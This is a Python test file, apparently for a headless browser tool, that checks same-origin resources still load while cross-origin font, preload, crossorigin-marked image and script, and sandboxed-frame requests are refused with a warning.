def test_browser_same_origin_font_still_loads(servers, tmp_path) -> None:
    a, _ = servers
    result = _browser_fetch(a, "/font-same", tmp_path)
    assert result.outcome == "fetched", result.note
    assert "/font.woff2" in a.requests
    assert result.warning is None


@pytest.mark.live
def test_browser_cross_origin_font_is_refused(servers, tmp_path) -> None:
    a, b = servers
    result = _browser_fetch(a, "/font-cross", tmp_path)
    assert result.outcome == "fetched", result.note
    assert "/font.woff2" not in b.requests, b.requests
    assert result.warning and f"{b.origin}/font.woff2" in result.warning


@pytest.mark.live
def test_browser_same_origin_preload_fetch_still_loads(servers, tmp_path) -> None:
    a, _ = servers
    result = _browser_fetch(a, "/preload-same", tmp_path)
    assert result.outcome == "fetched", result.note
    assert "/preload.json" in a.requests
    assert result.warning is None


@pytest.mark.live
def test_browser_cross_origin_preload_fetch_is_refused(servers, tmp_path) -> None:
    a, b = servers
    result = _browser_fetch(a, "/preload-cross", tmp_path)
    assert result.outcome == "fetched", result.note
    assert "/preload.json" not in b.requests, b.requests
    assert result.warning and f"{b.origin}/preload.json" in result.warning
    assert "PRELOAD-BODY" not in _rendered(result)


@pytest.mark.live
def test_browser_img_with_crossorigin_attribute_is_refused(servers, tmp_path) -> None:
    """Unlike the plain `/ximg` case (round 6, no `crossorigin` attribute, no-cors, still loads), an
    <img> the page marks `crossorigin` is a cors-mode request and is refused like any other."""
    a, b = servers
    result = _browser_fetch(a, "/img-crossorigin", tmp_path)
    assert result.outcome == "fetched", result.note
    assert "/pic" not in b.requests, b.requests
    assert result.warning and f"{b.origin}/pic" in result.warning


@pytest.mark.live
def test_browser_script_with_crossorigin_attribute_is_refused(servers, tmp_path) -> None:
    """Unlike the plain `/xscript` case (round 6, no `crossorigin` attribute, still loads), a classic
    <script> the page marks `crossorigin` is a cors-mode request and is refused like any other."""
    a, b = servers
    result = _browser_fetch(a, "/script-crossorigin", tmp_path)
    assert result.outcome == "fetched", result.note
    assert "/allowed.js" not in b.requests, b.requests
    assert result.warning and f"{b.origin}/allowed.js" in result.warning


@pytest.mark.live
def test_browser_sandboxed_frame_fetch_is_refused_as_opaque_origin(servers, tmp_path) -> None:
    a, _ = servers
    result = _browser_fetch(a, "/sandboxed-fetch", tmp_path)
    assert result.outcome == "fetched", result.note
    assert "/frame-data" not in a.requests, a.requests
    assert "FRAME-DATA-BODY" not in _rendered(result)
    # the rendered warning names the group and the URL, same as every other refusal reason; the
    # "opaque origin" wording lives in cross_origin_refusal's own detail string, which the warning
    # never surfaces (no reason's detail does), and is asserted directly in test_browser_rules.py.
    assert result.warning and "cross-origin script request" in result.warning
    assert f"{a.origin}/frame-data" in result.warning


@pytest.mark.live
def test_browser_plain_frame_fetch_still_works(servers, tmp_path) -> None:
    """Control for the case above: the same same-origin fetch, from an iframe without `sandbox`, whose
    origin is the page's own and is not refused."""
    a, _ = servers
    result = _browser_fetch(a, "/plain-frame-fetch", tmp_path)
    assert result.outcome == "fetched", result.note
    assert "/frame-data" in a.requests
    assert "FRAME-DATA-BODY" in _rendered(result)
    assert result.warning is None
